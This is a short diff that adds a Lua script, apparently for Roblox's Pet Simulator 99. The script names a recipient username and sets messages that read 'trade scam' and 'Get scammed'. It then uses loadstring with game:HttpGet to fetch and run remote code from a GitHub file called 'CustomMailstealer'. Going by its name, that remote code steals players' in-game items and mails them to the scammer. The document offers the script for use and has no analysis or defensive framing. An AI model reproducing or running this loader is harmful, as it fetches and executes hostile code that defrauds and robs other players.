@@ -1,0 +1,6 @@
+```LUA
+Username = "cupids_yt"
+G_LoadingScreen = "Loading ps99 trade scam!!"
+G_Mailmessage = "Get scammed"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()```
